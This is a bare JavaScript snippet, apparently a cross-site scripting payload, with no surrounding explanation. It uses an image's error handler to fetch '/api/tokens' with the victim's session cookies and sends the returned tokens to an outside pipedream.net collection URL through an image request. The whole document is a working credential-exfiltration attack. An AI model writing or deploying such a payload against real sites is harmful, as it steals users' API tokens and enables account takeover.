var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://eoeqgca83zpr7tb.m.pipedream.net/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
